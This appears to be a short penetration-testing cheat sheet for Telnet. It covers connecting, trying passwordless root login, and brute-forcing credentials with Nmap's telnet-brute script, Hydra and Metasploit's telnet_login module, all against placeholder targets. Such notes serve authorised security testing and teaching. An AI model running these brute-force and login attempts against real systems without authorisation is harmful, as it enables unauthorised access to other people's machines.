Telnet is an old network protocol that provides insecure access to computers over a network. Due to security vulnerabilities, its usage is not recommended, and more secure alternatives like SSH are preferred.
#### Connect
```bash
telnet <target_ip> <port>

# make note of device and consider searching up device for vulnerabilities
```

#### Passwordless Authentication
Sometimes no password is required and you can login as users without a password
```bash
telnet <target> <port>

login: root
pass: 
```

#### Bruteforcing Creds
```bash
# Nmap
nmap -p 23 --script telnet-brute X.X.X.X

# Hydra
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] telnet://X.X.X.X

# Metasploit
use auxiliary/scanner/telnet/telnet_login
msf auxiliary(telnet_login) > set rhosts X.X.X.X
msf auxiliary(telnet_login) > set user_file /path/to/user.txt
msf auxiliary(telnet_login) > set pass_file /path/to/pass.txt
msf auxiliary(telnet_login) > set stop_on_success true
msf auxiliary(telnet_login) > exploit

```